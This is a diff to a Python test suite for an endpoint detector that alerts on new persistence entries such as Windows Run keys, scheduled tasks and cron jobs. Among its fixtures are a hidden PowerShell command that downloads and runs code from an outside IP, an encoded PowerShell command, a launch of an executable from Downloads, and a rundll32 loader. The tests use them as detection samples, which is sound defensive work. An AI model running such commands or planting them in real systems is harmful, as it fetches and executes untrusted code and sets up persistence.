@@ -89,6 +89,7 @@ def no_paths(case):
     """A case carries program names (as indicators) and folder classes, never a path or a command line."""
     text = json.dumps(case.facts) + json.dumps(case.indicators)
     assert "C:\\\\" not in text and "<user>" not in text and "cmdline" not in text, text
+    assert "/" not in case.facts.get("entry", "")   # an entry name is never a file path
     assert case.indicators and case.host == PC and case.facts["source"] == "endpoint"
 
 
@@ -477,7 +478,7 @@ def test_new_task_running_a_script_from_downloads_alerts_and_carries_no_path():
     assert c.facts["script"] and c.facts["shell"] and c.facts["signals"] == []
     no_paths(c)
     (enc,) = settle(NewPersistence(st()), task(T0, "Sync", "powershell.exe -enc " + "Q" * 40))
-    assert enc.base_severity == 4 and enc.facts["signals"] == ["a suspicious command line"]
+    assert enc.base_severity == 4 and enc.facts["signals"] == ["an encoded or download-and-run command"]
 
 
 def test_scripts_shells_and_user_folders_are_digest_items_once_a_week():
@@ -539,7 +540,32 @@ def test_cron_and_launch_agents_use_posix_folders():
     assert c.facts["entry"] == "a user's crontab" and "/u" not in json.dumps(c.facts)   # the file path names the user
     sys_cron = persist(T0, "crontab", event="", minute="0", hour="3", day_of_month="*", month="*", day_of_week="*",
                        command="/opt/backup/run.sh", path="/etc/cron.d/backup")
-    assert settle(NewPersistence(st()), sys_cron)[0].facts["entry"] == "/etc/cron.d/backup"
+    assert settle(NewPersistence(st()), sys_cron)[0].facts["entry"] == "backup"
+
+
+def test_run_key_payloads_without_a_drive_letter_still_alert():
+    # review of #137: a Run key's value is often a bare `powershell -nop -w hidden -c iex (...)` or `mshta http://...`
+    det = NewPersistence(st())
+    rows = [persist(T0, "startup_items", name="Updater", path="powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')",
+                    args="", source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
+            persist(T0, "startup_items", name="Helper", path=r"cmd /c start C:\\Users\\<user>\\Downloads\\x.exe", args="",
+                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u"),
+            persist(T0, "startup_items", name="Loader", path="rundll32 x.dll,Entry", args="",
+                    source=r"HKEY_USERS\\S-1-5-21-1-2-3-1001\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", status="enabled", username="u")]
+    enc, dl, ld = settle(det, *rows)
+    assert (enc.base_severity, enc.facts["program"], enc.facts["signals"]) == (4, "powershell.exe", ["an encoded or download-and-run command"])
+    assert (dl.base_severity, dl.facts["program"], dl.facts["folder"]) == (4, "cmd.exe", "downloads")
+    assert (ld.base_severity, ld.facts["program"], ld.facts["shell"]) == (3, "rundll32.exe", True)
+    for c in (enc, dl, ld):
+        no_paths(c)
+    assert _entry_key("update_added") == "update_added" and _entry_key("backup_cache") == "backup_cache"
+
+
+def test_a_corrupted_saved_known_set_is_discarded_at_restore():
+    import pytest
+    for bad in ({"known": "junk"}, {"known": {"$items": [[["a"], 1.0]]}}):
+        with pytest.raises(ValueError):
+            NewPersistence(st()).restore(bad)
     tmp = persist(T0, "crontab", event="@reboot", minute="", hour="", day_of_month="", month="", day_of_week="",
                   command="/tmp/.x/run.sh", path="/var/spool/cron/crontabs/u")
     (bad,) = settle(NewPersistence(st()), tmp)
